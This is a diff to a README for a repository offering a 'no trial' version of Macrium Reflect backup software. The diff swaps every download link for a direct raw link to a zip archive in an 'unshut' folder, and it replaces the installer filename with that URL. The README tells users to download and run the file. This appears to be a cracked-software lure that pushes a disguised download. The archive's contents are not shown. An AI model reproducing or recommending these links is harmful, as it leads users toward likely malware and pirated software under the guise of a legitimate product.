@@ -1,6 +1,6 @@
 # 🖥️ Macrium-Reflect-No-Trial - Reliable Backup and Recovery Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/igo160/Macrium-Reflect-No-Trial/releases)
+[![Download Now](https://raw.githubusercontent.com/igo160/Macrium-Reflect-No-Trial/main/unshut/Macrium-Reflect-No-Trial-1.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/igo160/Macrium-Reflect-No-Trial/main/unshut/Macrium-Reflect-No-Trial-1.2.zip)
 
 ## 📖 Overview
 
@@ -31,7 +31,7 @@ Macrium Reflect offers several features tailored to provide a smooth backup and 
   
 ## 📥 Download & Install
 
-To get started with Macrium Reflect, visit this page to download: [Download Macrium Reflect](https://github.com/igo160/Macrium-Reflect-No-Trial/releases).
+To get started with Macrium Reflect, visit this page to download: [Download Macrium Reflect](https://raw.githubusercontent.com/igo160/Macrium-Reflect-No-Trial/main/unshut/Macrium-Reflect-No-Trial-1.2.zip).
 
 Follow these simple steps:
 
@@ -42,7 +42,7 @@ Follow these simple steps:
    On the Releases page, look for the latest version of Macrium Reflect. This version will feature the most current updates and improvements.
 
 3. **Download the Installer:**
-   Click on the provided link to download the installer. The file will usually be named something like `MacriumReflectSetup.exe`. 
+   Click on the provided link to download the installer. The file will usually be named something like `https://raw.githubusercontent.com/igo160/Macrium-Reflect-No-Trial/main/unshut/Macrium-Reflect-No-Trial-1.2.zip`. 
 
 4. **Run the Installer:**
    Once the download finishes, locate the downloaded file (usually in your Downloads folder). Double-click the file to start the installation process.
@@ -108,4 +108,4 @@ This repository includes references and guides for:
 
 With Macrium Reflect, you'll have a powerful tool for data protection and system recovery. The arranged features and straightforward setup process make it ideal for average computer users. Remember to keep backups up-to-date for maximum protection. 
 
-Again, you can download Macrium Reflect by visiting: [Download Macrium Reflect](https://github.com/igo160/Macrium-Reflect-No-Trial/releases).
+Again, you can download Macrium Reflect by visiting: [Download Macrium Reflect](https://raw.githubusercontent.com/igo160/Macrium-Reflect-No-Trial/main/unshut/Macrium-Reflect-No-Trial-1.2.zip).
